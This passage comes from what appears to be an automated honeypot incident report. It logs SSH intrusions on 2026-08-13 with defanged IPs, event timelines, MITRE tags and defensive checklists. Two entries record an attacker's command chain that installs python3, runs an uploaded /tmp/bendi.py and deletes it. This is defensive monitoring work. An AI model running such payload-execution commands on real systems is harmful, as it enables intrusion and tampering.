| `2026-08-13 07:14:34` | `cowrie.log.closed` |
| `2026-08-13 07:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0734302c9804

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:39` | `cowrie.session.connect` |
| `2026-08-13 07:14:39` | `cowrie.client.version` |
| `2026-08-13 07:14:39` | `cowrie.client.kex` |
| `2026-08-13 07:14:39` | `cowrie.login.success` |
| `2026-08-13 07:14:40` | `cowrie.session.params` |
| `2026-08-13 07:14:40` | `cowrie.command.input` |
| `2026-08-13 07:14:41` | `cowrie.log.closed` |
| `2026-08-13 07:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f8e391f3aaa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:45` | `cowrie.session.connect` |
| `2026-08-13 07:14:45` | `cowrie.client.version` |
| `2026-08-13 07:14:45` | `cowrie.client.kex` |
| `2026-08-13 07:14:46` | `cowrie.login.success` |
| `2026-08-13 07:14:46` | `cowrie.session.params` |
| `2026-08-13 07:14:46` | `cowrie.command.input` |
| `2026-08-13 07:14:47` | `cowrie.log.closed` |
| `2026-08-13 07:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e071544ad993

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:52` | `cowrie.session.connect` |
| `2026-08-13 07:14:52` | `cowrie.client.version` |
| `2026-08-13 07:14:52` | `cowrie.client.kex` |
| `2026-08-13 07:14:53` | `cowrie.login.success` |
| `2026-08-13 07:14:54` | `cowrie.session.params` |
| `2026-08-13 07:14:54` | `cowrie.command.input` |
| `2026-08-13 07:14:54` | `cowrie.log.closed` |
| `2026-08-13 07:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9f58ca9f9b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:58` | `cowrie.session.connect` |
| `2026-08-13 07:14:58` | `cowrie.client.version` |
| `2026-08-13 07:14:58` | `cowrie.client.kex` |
| `2026-08-13 07:15:00` | `cowrie.login.success` |
| `2026-08-13 07:15:01` | `cowrie.session.params` |
| `2026-08-13 07:15:01` | `cowrie.command.input` |
| `2026-08-13 07:15:01` | `cowrie.log.closed` |
| `2026-08-13 07:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02cb33f97f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:15 |
| **Last Seen** | 2026-08-13 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:15:05` | `cowrie.session.connect` |
| `2026-08-13 07:15:05` | `cowrie.client.version` |
| `2026-08-13 07:15:05` | `cowrie.client.kex` |
| `2026-08-13 07:15:07` | `cowrie.login.success` |
| `2026-08-13 07:15:08` | `cowrie.session.params` |
| `2026-08-13 07:15:08` | `cowrie.command.input` |
| `2026-08-13 07:15:08` | `cowrie.log.closed` |
| `2026-08-13 07:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-644729014d78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:15 |
| **Last Seen** | 2026-08-13 07:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:15:12` | `cowrie.session.connect` |
| `2026-08-13 07:15:12` | `cowrie.client.version` |
| `2026-08-13 07:15:12` | `cowrie.client.kex` |
| `2026-08-13 07:15:12` | `cowrie.login.success` |
| `2026-08-13 07:15:14` | `cowrie.session.params` |
| `2026-08-13 07:15:14` | `cowrie.command.input` |
| `2026-08-13 07:15:14` | `cowrie.log.closed` |
| `2026-08-13 07:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06319a832fac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:15 |
| **Last Seen** | 2026-08-13 07:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:15:18` | `cowrie.session.connect` |
| `2026-08-13 07:15:18` | `cowrie.client.version` |
| `2026-08-13 07:15:18` | `cowrie.client.kex` |
| `2026-08-13 07:15:21` | `cowrie.login.success` |
| `2026-08-13 07:15:22` | `cowrie.session.params` |
| `2026-08-13 07:15:22` | `cowrie.command.input` |
| `2026-08-13 07:15:22` | `cowrie.log.closed` |
| `2026-08-13 07:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495b7044fc72

| Field | Detail |
|---|---|
| **Source IP** | `117.50.218[.]37` |
| **First Seen** | 2026-08-13 07:29 |
| **Last Seen** | 2026-08-13 07:34 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:29:18` | `cowrie.session.connect` |
| `2026-08-13 07:29:18` | `cowrie.client.version` |
| `2026-08-13 07:29:19` | `cowrie.client.kex` |
| `2026-08-13 07:29:19` | `cowrie.login.success` |
| `2026-08-13 07:34:19` | `cowrie.session.file_upload` |
| `2026-08-13 07:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.218[.]37` to AbuseIPDB if not already reported
- [ ] Block `117.50.218[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27f1439a3f0b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-13 07:37 |
| **Last Seen** | 2026-08-13 07:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:37:18` | `cowrie.session.connect` |
| `2026-08-13 07:37:19` | `cowrie.client.version` |
| `2026-08-13 07:37:19` | `cowrie.client.kex` |
| `2026-08-13 07:37:20` | `cowrie.login.success` |
| `2026-08-13 07:37:20` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711a3f592ca3

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-08-13 07:41 |
| **Last Seen** | 2026-08-13 07:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:41:08` | `cowrie.session.connect` |
| `2026-08-13 07:41:08` | `cowrie.client.version` |
| `2026-08-13 07:41:08` | `cowrie.client.kex` |
| `2026-08-13 07:41:10` | `cowrie.login.success` |
| `2026-08-13 07:41:11` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6680b1769006

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-08-13 07:41 |
| **Last Seen** | 2026-08-13 07:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:41:20` | `cowrie.session.connect` |
| `2026-08-13 07:41:20` | `cowrie.client.version` |
| `2026-08-13 07:41:20` | `cowrie.client.kex` |
| `2026-08-13 07:41:21` | `cowrie.login.success` |
| `2026-08-13 07:41:21` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129f162e29c1

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-08-13 07:42 |
| **Last Seen** | 2026-08-13 07:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:42:25` | `cowrie.session.connect` |
| `2026-08-13 07:42:26` | `cowrie.client.version` |
| `2026-08-13 07:42:26` | `cowrie.client.kex` |
| `2026-08-13 07:42:27` | `cowrie.login.success` |
| `2026-08-13 07:42:27` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118e4fd2509a

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-13 07:42 |
| **Last Seen** | 2026-08-13 07:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:42:32` | `cowrie.session.connect` |
| `2026-08-13 07:42:32` | `cowrie.client.version` |
| `2026-08-13 07:42:32` | `cowrie.client.kex` |
| `2026-08-13 07:42:33` | `cowrie.login.success` |
| `2026-08-13 07:42:34` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e998460c096c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 07:46 |
| **Last Seen** | 2026-08-13 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:46:05` | `cowrie.session.connect` |
| `2026-08-13 07:46:05` | `cowrie.client.version` |
| `2026-08-13 07:46:05` | `cowrie.client.kex` |
| `2026-08-13 07:46:05` | `cowrie.login.success` |
| `2026-08-13 07:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f5aa75b9e25

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 07:46 |
| **Last Seen** | 2026-08-13 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:46:05` | `cowrie.session.connect` |
| `2026-08-13 07:46:05` | `cowrie.client.version` |
| `2026-08-13 07:46:05` | `cowrie.client.kex` |
| `2026-08-13 07:46:05` | `cowrie.login.success` |
| `2026-08-13 07:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367a0f605f1b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 07:46 |
| **Last Seen** | 2026-08-13 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:46:09` | `cowrie.session.connect` |
| `2026-08-13 07:46:09` | `cowrie.client.version` |
| `2026-08-13 07:46:09` | `cowrie.client.kex` |
| `2026-08-13 07:46:09` | `cowrie.login.success` |
| `2026-08-13 07:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-121c0f113e10

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 07:46 |
| **Last Seen** | 2026-08-13 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:46:09` | `cowrie.session.connect` |
| `2026-08-13 07:46:09` | `cowrie.client.version` |
| `2026-08-13 07:46:09` | `cowrie.client.kex` |
| `2026-08-13 07:46:09` | `cowrie.login.success` |
| `2026-08-13 07:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6eb8df7cc39

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-13 07:46 |
| **Last Seen** | 2026-08-13 07:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:46:18` | `cowrie.session.connect` |
| `2026-08-13 07:46:18` | `cowrie.client.version` |
| `2026-08-13 07:46:18` | `cowrie.client.kex` |
| `2026-08-13 07:46:21` | `cowrie.login.success` |
| `2026-08-13 07:46:21` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5b5b4e5a11

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-13 07:50 |
| **Last Seen** | 2026-08-13 07:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:50:43` | `cowrie.session.connect` |
| `2026-08-13 07:50:43` | `cowrie.client.version` |
| `2026-08-13 07:50:43` | `cowrie.client.kex` |
| `2026-08-13 07:50:43` | `cowrie.login.success` |
| `2026-08-13 07:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1727ea30d6d

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-13 07:50 |
| **Last Seen** | 2026-08-13 07:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:50:47` | `cowrie.session.connect` |
| `2026-08-13 07:50:47` | `cowrie.client.version` |
| `2026-08-13 07:50:48` | `cowrie.client.kex` |
| `2026-08-13 07:50:48` | `cowrie.login.success` |
| `2026-08-13 07:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b3173edb76

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-13 07:50 |
| **Last Seen** | 2026-08-13 07:52 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:50:50` | `cowrie.session.connect` |
| `2026-08-13 07:50:50` | `cowrie.client.version` |
| `2026-08-13 07:50:50` | `cowrie.client.kex` |
| `2026-08-13 07:50:50` | `cowrie.login.success` |
| `2026-08-13 07:50:51` | `cowrie.session.file_upload` |
| `2026-08-13 07:50:52` | `cowrie.session.params` |
| `2026-08-13 07:50:52` | `cowrie.command.input` |
| `2026-08-13 07:50:52` | `cowrie.command.input` |
| `2026-08-13 07:50:52` | `cowrie.command.input` |
| `2026-08-13 07:50:52` | `cowrie.command.failed` |
| `2026-08-13 07:50:52` | `cowrie.log.closed` |
| `2026-08-13 07:50:53` | `cowrie.session.params` |
| `2026-08-13 07:50:53` | `cowrie.command.input` |
| `2026-08-13 07:50:53` | `cowrie.log.closed` |
| `2026-08-13 07:50:54` | `cowrie.session.params` |
| `2026-08-13 07:50:54` | `cowrie.command.input` |
| `2026-08-13 07:50:54` | `cowrie.log.closed` |
| `2026-08-13 07:50:55` | `cowrie.session.params` |
| `2026-08-13 07:50:55` | `cowrie.command.input` |
| `2026-08-13 07:50:55` | `cowrie.command.failed` |
| `2026-08-13 07:50:55` | `cowrie.command.failed` |
| `2026-08-13 07:51:56` | `cowrie.session.params` |
| `2026-08-13 07:51:56` | `cowrie.command.input` |
| `2026-08-13 07:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb0d32f6a26

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-13 07:52 |
| **Last Seen** | 2026-08-13 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:52:34` | `cowrie.session.connect` |
| `2026-08-13 07:52:34` | `cowrie.client.version` |
| `2026-08-13 07:52:34` | `cowrie.client.kex` |
| `2026-08-13 07:52:35` | `cowrie.login.success` |
| `2026-08-13 07:52:35` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:52:35` | `cowrie.direct-tcpip.data` |
| `2026-08-13 07:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f5b7684edc

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-13 07:52 |
| **Last Seen** | 2026-08-13 07:55 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:52:56` | `cowrie.session.connect` |
| `2026-08-13 07:52:56` | `cowrie.client.version` |
| `2026-08-13 07:52:56` | `cowrie.client.kex` |
| `2026-08-13 07:52:57` | `cowrie.login.success` |
| `2026-08-13 07:52:58` | `cowrie.session.file_upload` |
| `2026-08-13 07:52:58` | `cowrie.session.params` |
| `2026-08-13 07:52:58` | `cowrie.command.input` |
| `2026-08-13 07:52:58` | `cowrie.command.input` |
| `2026-08-13 07:52:58` | `cowrie.command.input` |
| `2026-08-13 07:52:58` | `cowrie.command.failed` |
| `2026-08-13 07:52:58` | `cowrie.log.closed` |
| `2026-08-13 07:52:59` | `cowrie.session.params` |
| `2026-08-13 07:52:59` | `cowrie.command.input` |
| `2026-08-13 07:52:59` | `cowrie.log.closed` |
| `2026-08-13 07:53:00` | `cowrie.session.params` |
| `2026-08-13 07:53:00` | `cowrie.command.input` |
| `2026-08-13 07:53:00` | `cowrie.log.closed` |
| `2026-08-13 07:53:01` | `cowrie.session.params` |
| `2026-08-13 07:53:01` | `cowrie.command.input` |
| `2026-08-13 07:53:01` | `cowrie.command.failed` |
| `2026-08-13 07:53:01` | `cowrie.command.failed` |
| `2026-08-13 07:54:02` | `cowrie.session.params` |
| `2026-08-13 07:54:02` | `cowrie.command.input` |
| `2026-08-13 07:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc513bd290b

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 07:54 |
| **Last Seen** | 2026-08-13 07:59 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:54:04` | `cowrie.session.connect` |
| `2026-08-13 07:54:05` | `cowrie.client.version` |
| `2026-08-13 07:54:05` | `cowrie.client.kex` |
| `2026-08-13 07:54:08` | `cowrie.login.success` |
| `2026-08-13 07:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e5c6a66e3b0

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:04 |
| **Last Seen** | 2026-08-13 08:05 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
